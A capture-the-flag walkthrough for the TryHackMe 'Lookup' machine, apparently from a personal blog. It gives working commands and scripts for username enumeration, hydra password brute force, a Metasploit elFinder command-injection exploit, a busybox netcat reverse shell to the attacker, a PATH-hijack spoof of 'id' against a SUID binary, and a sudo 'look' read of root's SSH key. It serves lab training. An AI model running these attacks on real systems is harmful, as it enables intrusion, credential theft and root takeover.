---
title: 'TryHackMe: Lookup CTF Walkthrough'
author: 0xcracker
categories: [TryHackMe]
tags: [web, rustscan, hydra, feroxbuster, ffuf, DNS, Subdomain-Enumeration, searchsploit, msfconsole, RCE, command injection, ssh, strings, time, suid, sudo, strace, busybox, Spoof-Binary, PATH-Hijack]
render_with_liquid: true
img_path: /images/Lookup
image:
  path: /images/TryHackMe/Lookup/room_image.webp
---

<a href="https://tryhackme.com/room/lookup" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #a1a1a1ff; text-decoration: none;">TryHackMe | Lookup CTF Challenge
  <img src="https://tryhackme.com/r/favicon.png" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

🧰 Writeup Overview

is a `Linux-based machine` that focuses on:

- Subdomain enumeration to uncover a hidden elFinder file manager
- Remote Code Execution (RCE) via a vulnerable PHP connector in elFinder
- Privilege escalation through a misconfigured `SUID binary` and abused PATH variable
- SSH brute-force using harvested credentials
- Root access using a `leaked private key` extracted with the `look GTFOBin`

The box challenges your skills in `enumeration`, `web exploitation`, `password attacks`, and `local privilege escalation`, and is ideal for learning real-world exploitation techniques.

## 🧾 Recon(Lookup)
Edit `/etc/hosts`
```sh
sudo nano /etc/hosts
```
Add:
```sh
10.10.158.59    lookup.thm
```
### Open Ports Found
RustScan (Initial Fast Port Scan)
```sh
rustscan -a lookup.thm -p 22,80,8000,8089,8191,33399,50000 -- -sCV -T4 -oN lookup.nmap
```

```sh
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
22 (OpenSSH 8.2p1 Ubuntu)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enumeration
Directory Bruteforce
```sh
feroxbuster -u http://lookup.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 --filter-status 403,404 -x php
```
```
200      GET        1l        0w        1c http://lookup.thm/login.php
200      GET       50l       84w      687c http://lookup.thm/styles.css
200      GET       26l       50w      719c http://lookup.thm/
200      GET       26l       50w      719c http://lookup.thm/index.php
```
 

### Virtual Host(Subdomains) Enumeration
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  \
-u http://targeted-ip -H "Host: FUZZ.lookup.thm" -fs 0
```

> We can use -fc == filter code OR -fs == filter size
{: .prompt-info }

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  \         
-u http://targeted-ip -H "Host: FUZZ.lookup.thm" -fc 302
```

OR
```
gobuster vhost -u http://lookup.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Unfortunately, it didn't appear due to lack of connection so that need Credential.


### User Enumeration

Extract users  based on server response
![](/images/TryHackMe/Lookup/req1.png)

![](/images/TryHackMe/Lookup/req2.png)

#### **option |**
```sh
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST \
-d "username=FUZZ&password=wrongpass" \
-u http://lookup.thm/login.php \
-H "Content-Type: application/x-www-form-urlencoded" \
-mr "Wrong password. Please try again"
```
result `admin`,`jose`
```sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=wrongpass
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Wrong password. Please try again
________________________________________________

admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 83ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
```

#### **option ||**
with code python to do that
```py
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

URL = "http://lookup.thm/login.php"
WORDLIST = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"
THREADS = 100
MATCH_TEXT = "Wrong password"  # <-- Change this if your app says "Invalid password" or similar

lock = threading.Lock()

def check_username(username):
    username = username.strip()
    if not username:
        return

    data = {
        "username": username,
        "password": "wrongpass"
    }

    try:
        response = requests.post(URL, data=data, timeout=5)
        if MATCH_TEXT in response.text:
            with lock:
                print(username)
    except requests.RequestException:
        pass  # optionally print error

def main():
    with open(WORDLIST, "r") as file:
        usernames = [line.strip() for line in file if line.strip()]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(check_username, usernames)

if __name__ == "__main__":
    main()
```

```sh
time python3 Username_Enumeration
```
 that took approximately `149.21` seconds to complete.

```sh                                                                           
admin
jose

real    49.21s
user    22.57s
sys     12.81s
cpu     71%
```


#### **option |||**
```py
import aiohttp
import asyncio

TARGET = 'http://lookup.thm/login.php'
WORDLIST = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"
valid_usernames = []

async def check_username(session, username):
    """Check if a username is valid by sending a POST request."""
    form_data = {'username': username.strip(), 'password': 'test'}
    try:
        async with session.post(TARGET, data=form_data) as response:
            response_text = await response.text()
            if 'Wrong username' not in response_text:
                valid_usernames.append(username.strip())
                print(f"[+] Found valid username: {username.strip()}")
    except Exception as e:
        print(f"[!] Error checking {username.strip()}: {e}")

async def main():
    """Read usernames from wordlist and check them asynchronously."""
    async with aiohttp.ClientSession() as session:
        try:
            with open(WORDLIST, 'r') as file:
                usernames = file.readlines()
                tasks = [check_username(session, uname) for uname in usernames]
                await asyncio.gather(*tasks)
        except FileNotFoundError:
            print(f"[!] Wordlist not found at: {WORDLIST}")
            return

    print("\n[+] Valid usernames found:", valid_usernames)

if __name__ == "__main__":
    asyncio.run(main())
```

```sh
time python3 Username_Enumeration.py
```

```sh
[+] Found valid username: admin
[+] Found valid username: jose

[+] Valid usernames found: ['admin', 'jose']

real	23.57s
user	4.72s
sys	    0.94s
cpu	    24%

```

## 🦿 Foothold

### Credential Brute Force
```sh
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again" -V
```
jose is vaild Credential to log in `http:/lookup.thm` 

```sh
[80][http-post-form] host: lookup.thm   login: jose   password: **********
```

> If I add flags or other arguments after the methode (http-form-port), hydra didn’t do anything. To work, I had to let the command line end with the method used.
{: .prompt-tip }

![](/images/TryHackMe/Lookup/elfinder.png)

## 💀 Exploiting elFinder

Visit `http://files.lookup.thm` — elFinder web interface is visible.

Add it to `/etc/hosts`:
```sh
10.10.158.59    lookup.thm    files.lookup.thm
```

Search for Exploits
```sh
searchsploit elFinder
```

Metasploit Exploit

> Web Login Required Before Exploiting,
> You must log in as user `jose` at `http://lookup.thm/` to access the `files.lookup.thm` file manager over Uploading payload.
{: .prompt-warning }


```sh
msfconsole -q
search elFinder
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set LHOST tun0
run
```

Get shell access:
```sh
shell
id
```
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Finally, After gaining access through an elFinder RCE exploit, we obtain a limited shella `foothold` as a `www-data` user.


![](/images/TryHackMe/Lookup/foothold.png)

## 🏴‍☠️ User flag

### Stabilize Shell & Move Laterally

Setup Listener on Your `Local Machine`
```sh
nc -lvnp 3333
```
Then from target Machine(Shell Metasploit):
```sh
busybox nc <your_tun0> 3333 -e bash
```

![](/images/TryHackMe/Lookup/reverse-shell.png)

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm-256color
cd /home/think
```

### Privilege Escalation Prep
Privilege Escalation Attempt (SUID Binaries):

```sh
find / -perm /4000 2>/dev/null
```
Found executable file `/usr/sbin/pwm`

```sh
/usr/sbin/pwm
```
Output:
```sh
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

```sh
strings /usr/sbin/pwm
```
✅ Key Observations from strings /usr/sbin/pwm
Let’s extract the important parts:
```sh
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
uid=%*u(%[^)])
[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
```
It runs the `id` command with:
```c
popen("id", "r")
```
It uses a `scanf`-like pattern:
```c
uid=%*u(%[^)])
```

```sh
strace -e trace=process /usr/sbin/pwm
```
What `strace` Reveals:
```sh
[!] Running 'id' command to extract the username and user ID (UID)
clone(...) = 3568
...
[!] ID: www-data
```
What does this mean?
The binary spawns a child process using `clone()` → that's how it runs the `id` command.

The output is parsed, and it detects the current user is `www-data`.

Then it looks for `/home/www-data/.passwords` but doesn't find it.

🔐 Key Insight
Since the binary uses `clone()` (which implies it uses `popen()` internally), and calls `id` without full path, you can trick it by making a `fake id binary` earlier in your `PATH`.

🔎 Explanation:
- It runs the `id` command to determine which user is executing the program.
- You are currently user `www-data`, so it tries to read `/home/www-data/.passwords`, But that file doesn't exist → hence the error.
- We need a trick in executable file `/usr/sbin/pwm` to make UID `think` the owner of the file `/home/www-data/.passwords` instead of UID `www-data` via `Spoof binary id command`, then we can read it.


`Spoof binary` using `PATH` hijack:

- Make a fake id binary
```sh
cd /tmp
echo '#!/bin/bash' > /tmp/id
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" >> /tmp/id
chmod +x id
```

- Hijack the PATH
```sh
export PATH=/tmp:$PATH
```

- Run the binary

now we can read it & Extracting Password Wordlist:
```sh
/usr/sbin/pwm
```

```sh
/usr/sbin/pwm > passwords
```

### Brute-force SSH using harvested passwords
```sh
python3 -m http.server 8080
```

```sh
# From attacker:
wget http://lookup.thm:8080/passwords

hydra -l think -P passwords -f lookup.thm ssh
```

```sh
ssh think@lookup.thm
```

```sh
think@ip-10-10-99-50:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

You now have user flag:
```sh
cat user.txt
```

## 🏴‍☠️ Root flag

### Privilege Escalation

```sh
sudo -l
```
Output:
```sh
(ALL) /usr/bin/look
```
you can check here

<a href="https://gtfobins.github.io/gtfobins/look/" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #fff; text-decoration: none;">GTFOBins | look
  <img src="/images/TryHackMe/gtfobins.png" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

```sh
sudo /usr/bin/look '' "/root/.ssh/id_rsa"
```

### Root Access via SSH Key
Save key to file:
```sh
gedit id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```
> A key in PEM format like this one, has to have an empty line at the end.
{: .prompt-tip }

```sh
root@ip-10-10-99-50:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Capture the Flag
```sh
cat root.txt
```

<div style="text-align: center;">
  <img src="/gifs/labubu.gif" alt="gif">
</div>
